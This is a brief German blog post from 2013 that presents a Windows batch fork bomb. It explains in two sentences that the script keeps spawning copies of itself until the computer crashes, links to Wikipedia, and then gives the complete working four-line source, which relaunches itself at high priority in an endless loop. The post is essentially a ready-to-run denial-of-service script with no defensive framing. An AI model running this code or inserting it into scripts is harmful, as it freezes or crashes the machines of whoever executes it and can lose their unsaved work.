.. title: Fork-Bomb in Batch (Windows)
.. date: 2013/06/16 18:06
.. type: text

Beschreibung
------------

Dieses bischen Code startet einen Prozess, der sich selber startet und der somit neu gestartete Prozess tut das selbe.

Dadurch werden immer mehr Prozesse gestartet, bis der Computer abstürzt.

Eine gute Beschreibung mit weiteren Beispielen in anderen Programmiersprachen gibt es in der Wikipedia: http://de.wikipedia.org/wiki/Forkbomb

Source Code
-----------

.. code-block:: batch

    @echo off
    :start
    start "XXX" /high %0
    goto :start
